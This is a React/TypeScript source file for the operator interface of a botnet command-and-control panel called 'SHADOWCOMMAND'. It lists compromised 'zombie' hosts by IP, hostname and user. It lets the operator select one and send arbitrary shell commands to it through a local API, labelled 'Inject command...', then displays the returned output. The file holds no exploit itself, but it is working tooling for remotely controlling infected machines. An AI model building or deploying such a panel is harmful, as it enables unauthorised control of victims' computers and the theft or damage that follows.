import { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_URL = 'http://127.0.0.1:8000';

interface Zombie { id: string; ip: string; hostname: string; os: string; last_seen: string; username: string; }
interface LogEntry { type: 'cmd' | 'result'; content: string; time: string; }

function App() {
  const [zombies, setZombies] = useState<Zombie[]>([]);
  const [selectedZombie, setSelectedZombie] = useState<string | null>(null);
  const [command, setCommand] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const logsEndRef = useRef<HTMLDivElement>(null);

  // Auto-scroll
  useEffect(() => { logsEndRef.current?.scrollIntoView({ behavior: "smooth" }); }, [logs]);

  // Polling de Zombies y Logs
  useEffect(() => {
    const fetchZombies = async () => {
      try {
        const res = await axios.get(`${API_URL}/api/zombies`);
        setZombies(res.data);
      } catch (error) { console.error("OFFLINE"); }
    };
    fetchZombies();
    const interval = setInterval(fetchZombies, 2000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!selectedZombie) return;
    const fetchLogs = async () => {
      try {
        const res = await axios.get(`${API_URL}/api/logs/${selectedZombie}`);
        if (res.data.length > 0) {
            setLogs(prev => {
                const newLogs = res.data.filter((r: any) => !prev.some(p => p.content === r.content && p.time === r.time));
                return [...prev, ...newLogs];
            });
        }
      } catch (e) { }
    };
    const interval = setInterval(fetchLogs, 1000);
    return () => clearInterval(interval);
  }, [selectedZombie]);

  const sendCommand = async () => {
    if (!selectedZombie || !command) return;
    try {
      await axios.post(`${API_URL}/shell/${selectedZombie}`, null, { params: { cmd: command } });
      const newLog: LogEntry = { type: 'cmd', content: `> ${command}`, time: new Date().toLocaleTimeString() };
      setLogs(prev => [...prev, newLog]);
      setCommand('');
    } catch (e) { alert("Error de transmisión"); }
  };

  return (
    <div style={{ display: 'grid', gridTemplateRows: '60px 1fr', height: '100vh', padding: '20px', boxSizing: 'border-box', gap: '20px' }}>
      
      {/* HEADER CYBERPUNK */}
      <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '2px solid #333', paddingBottom: '10px' }}>
        <h1 style={{ margin: 0, textShadow: '0 0 10px rgba(0, 255, 0, 0.7)', letterSpacing: '2px', color: '#0f0' }}>
          SHADOW<span style={{color:'white'}}>COMMAND</span>
        </h1>
        <div style={{ display: 'flex', gap: '15px', fontSize: '0.8em' }}>
          <div style={{ color: '#0f0', border: '1px solid #0f0', padding: '5px 10px' }}>SYSTEM: ONLINE</div>
          <div style={{ color: 'red', border: '1px solid red', padding: '5px 10px' }}>ENCRYPTION: AES-256</div>
        </div>
      </header>
      
      <div style={{ display: 'grid', gridTemplateColumns: '300px 1fr', gap: '20px', height: '100%' }}>
        
        {/* LISTA LATERAL */}
        <div style={{ border: '1px solid #333', background: 'rgba(0,0,0,0.5)' }}>
          <div style={{ background: '#111', padding: '10px', color: '#888', borderBottom: '1px solid #333', fontWeight: 'bold' }}>TARGETS DETECTED</div>
          {zombies.map(z => (
            <div 
              key={z.id} onClick={() => { setSelectedZombie(z.id); setLogs([]); }}
              style={{ 
                padding: '15px', borderBottom: '1px solid #222', cursor: 'pointer',
                background: selectedZombie === z.id ? 'rgba(0, 255, 0, 0.1)' : 'transparent',
                borderLeft: selectedZombie === z.id ? '4px solid #0f0' : '4px solid transparent'
              }}
            >
              <div style={{color: '#fff', fontWeight: 'bold'}}>🖥️ {z.hostname}</div>
              <div style={{fontSize: '0.8em', color: '#666', marginTop: '5px'}}>{z.ip}</div>
              <div style={{fontSize: '0.8em', color: '#444'}}>USER: {z.username}</div>
            </div>
          ))}
        </div>

        {/* TERMINAL PRINCIPAL */}
        <div style={{ display: 'flex', flexDirection: 'column', border: '1px solid #333', background: '#000' }}>
          <div style={{ padding: '5px 10px', background: '#111', color: '#555', fontSize: '0.8em', borderBottom: '1px solid #333' }}>
            TERMINAL ACCESS // {selectedZombie || "WAITING FOR TARGET..."}
          </div>
          
          <div style={{ flex: 1, padding: '20px', overflowY: 'auto', fontFamily: 'Courier New' }}>
            {logs.map((l, i) => (
              <div key={i} style={{ marginBottom: '15px' }}>
                <div style={{fontSize: '0.7em', color: '#444', marginBottom: '2px'}}>[{l.time}]</div>
                <div style={{ color: l.type === 'cmd' ? '#0f0' : '#ccc', whiteSpace: 'pre-wrap' }}>
                  {l.content}
                </div>
              </div>
            ))}
            <div ref={logsEndRef} />
          </div>

          <div style={{ display: 'flex', borderTop: '1px solid #333', background: '#050505' }}>
            <span style={{ padding: '15px', color: '#0f0', fontWeight: 'bold' }}>root@shadow:~#</span>
            <input 
              disabled={!selectedZombie}
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && sendCommand()}
              placeholder={selectedZombie ? "Inject command..." : "SELECT TARGET"}
              style={{ flex: 1, background: 'transparent', border: 'none', color: 'white', fontFamily: 'Courier New', fontSize: '1em', outline: 'none' }} 
            />
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;